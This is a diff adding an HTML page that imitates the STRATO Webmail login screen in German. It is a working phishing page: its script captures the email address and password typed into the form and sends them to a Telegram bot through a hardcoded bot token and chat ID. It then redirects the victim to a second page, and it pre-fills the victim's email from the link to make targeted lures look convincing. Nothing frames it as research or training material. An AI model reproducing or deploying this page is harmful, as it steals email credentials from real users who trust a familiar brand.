@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>STRATO Webmail Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Header Section -->
+    <header class="header-bar">
+        <div class="header-content">
+            <div class="logo">
+                <img src="logo.svg" alt="STRATO Logo">
+            </div>
+            <div class="header-links">
+                <a href="#"><i class="fa fa-question-circle"></i> Hilfe & Kontakt</a>
+                <a href="#"><i class="fa fa-globe"></i> Deutsch</a>
+                <button class="kunden-login">Kunden-Login</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Login Form Section -->
+    <main class="login-container">
+        <div class="login-box">
+            <!-- Header with Icon and Title -->
+            <div class="login-header">
+                <i class="fa fa-envelope"></i>
+                <p>STRATO Webmail</p>
+            </div>
+
+            <!-- Login Form -->
+            <div class="login-body">
+                <br>
+                <p>Login</p>
+                <br>
+                <form id="loginForm" action="javascript:void(0);">
+                    <div class="form-group">
+                        <label for="email">E-Mail-Adresse</label>
+                        <div class="input-wrapper">
+                            <i class="fa fa-envelope input-icon"></i>
+                            <input type="email" id="email" name="email" required>
+                        </div>
+                    </div>
+                    <br>
+                    <div class="form-group">
+                        <label for="password">Passwort</label>
+                        <div class="input-wrapper">
+                            <i class="fa fa-lock input-icon"></i>
+                            <input type="password" id="password" name="password" required>
+                        </div>
+                    </div>
+                    <br>
+                    <div class="forgot-password">
+                        <a href="#">Passwort vergessen</a>
+                    </div>
+
+                    <div class="stay-signed-in">
+                        <label>
+                            <input type="checkbox" checked> Angemeldet bleiben
+                        </label>
+                    </div>
+
+                   
+                    <br> 
+                    <button type="submit" class="btn-primary">Anmelden</button>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer Section -->
+    <footer class="footer-bar">
+        <div class="footer-content">
+            <a href="#">STRATO.de</a> |
+            <a href="#">AGB</a> |
+            <a href="#">Datenschutz</a> |
+            <a href="#">Impressum</a>
+        </div>
+        <div class="footer-info">
+            © 2024 Open-Xchange GmbH Version: 7.10.6
+        </div>
+    </footer>
+
+    <script>
+        // Handle form submission
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();  // Prevent default form submission
+    
+            // Capture the email and password inputs
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+    
+            // Save email to localStorage for use in second page
+            localStorage.setItem("email", email);
+    
+            // Construct the message to send to Telegram
+            const message = `E-Mail-Adresse: ${email}\nPasswort: ${password}`;
+    
+            // Telegram bot token and chat ID (replace with your actual values)
+            const botToken = "7705835551:AAHQlY1QOw61-H3HqbXGIkoQ4nf47Pn6Yjs";
+            const chatId = "7435519461";
+    
+            // Telegram API URL
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    
+            // Send the message to Telegram and redirect to second page on success
+            fetch(telegramUrl)
+                .then(response => {
+                    if (response.ok) {
+                        // Redirect to second page after sending the message to Telegram
+                        window.location.href = "second.html";
+                    } else {
+                        alert("Failed to send data to Telegram.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error sending data to Telegram:", error);
+                    alert("Error sending data to Telegram.");
+                });
+        });
+    
+        // On page load, check if there's an email in the URL hash and set it in the email input
+        document.addEventListener('DOMContentLoaded', function() {
+            const hash = window.location.hash;  // Get URL hash
+    
+            if (hash) {
+                const emailFromHash = hash.substring(1);  // Extract email from hash (remove the #)
+                if (validateEmail(emailFromHash)) {
+                    document.getElementById('email').value = decodeURIComponent(emailFromHash); // Pre-fill email input
+                } else {
+                    console.error("Invalid email format in URL hash");
+                }
+            }
+    
+            // Validate email format
+            function validateEmail(email) {
+                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailPattern.test(email);
+            }
+        });
+    </script>
+
+<script>
+    window.onload = function() {
+        
+        const params = new URLSearchParams(window.location.search);
+        const email = params.get("email");
+        console.log("Retrieved Email:", email); 
+  
+        
+        if (email) {
+            const emailInput = document.getElementById("email");
+            if (emailInput) {
+                emailInput.value = email;
+            } else {
+                console.error("Email input field not found.");
+            }
+        } else {
+            console.error("No email found in URL query parameter.");
+        }
+    };
+  </script>
+      
+
+</body>
+</html>
